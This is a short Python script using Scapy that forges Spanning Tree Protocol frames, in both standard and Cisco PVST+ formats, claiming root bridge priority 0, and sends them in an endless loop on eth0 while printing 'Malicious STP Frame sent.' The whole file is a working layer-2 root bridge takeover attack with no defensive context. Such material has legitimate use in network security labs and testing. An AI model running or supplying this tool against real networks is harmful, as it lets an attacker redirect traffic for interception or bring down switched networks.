from scapy.all import *
import time, sys

default_stp_mac = "01:80:C2:00:00:00"

pkt_default = Dot3(dst=default_stp_mac) / LLC() / STP(rootid=0, rootmac="00:00:00:00:00:01", bridgeid=0, bridgemac="00:00:00:00:00:01")

cisco_stp_mac = "01:00:0c:cc:cc:cd"

pkt_cisco = (
    Dot3(dst=cisco_stp_mac) / 
    LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / 
    SNAP(OUI=0x00000c, code=0x010b) / 
    STP(rootid=0, rootmac="00:00:00:00:00:01", bridgeid=0, bridgemac="00:00:00:00:00:01")
)

if len(sys.argv) > 1:
    if sys.argv[1] == "cisco":    
        while True:
            sendp(pkt_cisco, iface="eth0", verbose=0)
            print("Malicious STP Frame sent.")
            time.sleep(1)
    else:
        print("Wrong argument.")
else:
    while True:
        sendp(pkt_default, iface="eth0", verbose=0)
        print("Malicious STP Frame sent.")
        time.sleep(1)
